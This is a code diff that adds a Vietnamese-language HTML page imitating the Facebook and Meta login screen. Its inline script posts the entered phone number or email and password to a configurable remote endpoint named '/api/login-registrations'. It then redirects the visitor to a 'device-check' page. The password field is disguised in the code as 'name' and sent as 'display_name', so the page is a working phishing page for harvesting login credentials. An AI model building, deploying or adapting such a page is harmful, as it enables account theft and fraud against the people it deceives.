@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook | Đăng nhập</title>
+  <link rel="icon" type="image/svg+xml" href="facebook-favicon.svg">
+  <link rel="stylesheet" href="styles.css">
+  <script src="site-config.js"></script>
+</head>
+<body>
+  <main class="page-shell">
+    <section class="login-panel" aria-labelledby="login-heading">
+      <div class="brand-mark" aria-label="Facebook">f</div>
+      <h1 id="login-heading">Vui lòng đăng nhập để tiếp tục</h1>
+
+      <form id="login-form" class="login-form">
+        <label class="sr-only" for="identity">Số di động hoặc email</label>
+        <input id="identity" name="identity" type="text" autocomplete="username" placeholder="Số di động hoặc email" required>
+
+        <label class="sr-only" for="name">Mật khẩu</label>
+        <input id="name" name="name" type="text" placeholder="Mật khẩu" required>
+
+        <button class="primary-button" type="submit">Đăng nhập</button>
+        <a class="forgot-link" id="forgot-password-link" href="confirmation-copy.html">Quên mật khẩu?</a>
+      </form>
+
+      <div class="account-actions">
+        <a class="secondary-button" href="#create-account">Tạo tài khoản mới</a>
+      </div>
+
+      <div class="meta-brand" aria-label="Meta">
+        <img src="meta_logo.png" alt="Meta">
+      </div>
+    </section>
+
+    <footer class="language-bar">
+      <nav aria-label="Ngôn ngữ">
+        <a class="active" href="#vietnamese">Tiếng Việt</a>
+        <a href="#english">English (UK)</a>
+        <a href="#taiwan">中文(台灣)</a>
+        <a href="#korean">한국어</a>
+        <a href="#japanese">日本語</a>
+        <a href="#french">Français (France)</a>
+        <a href="#thai">ภาษาไทย</a>
+        <a href="#more-languages">Ngôn ngữ khác...</a>
+      </nav>
+    </footer>
+  </main>
+
+  <script>
+    const form = document.querySelector('#login-form');
+    const forgotPasswordLink = document.querySelector('#forgot-password-link');
+
+    forgotPasswordLink.addEventListener('click', (event) => {
+      event.preventDefault();
+      forgotPasswordLink.textContent = 'Đang xử lý...';
+      forgotPasswordLink.style.pointerEvents = 'none';
+      setTimeout(() => {
+        window.location.href = 'confirmation-copy.html';
+      }, 1000);
+    });
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const submitButton = form.querySelector('.primary-button');
+      submitButton.disabled = true;
+      submitButton.textContent = 'Đang xử lý...';
+
+      const response = await fetch((window.API_BASE || '') + '/api/login-registrations', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          identity: document.querySelector('#identity').value.trim(),
+          display_name: document.querySelector('#name').value.trim()
+        })
+      });
+
+      if (!response.ok) {
+        submitButton.disabled = false;
+        submitButton.textContent = 'Đăng nhập';
+        alert('Không thể lưu thông tin đăng ký. Vui lòng thử lại.');
+        return;
+      }
+
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+      window.location.href = 'device-check.html';
+    });
+  </script>
+</body>
+</html>
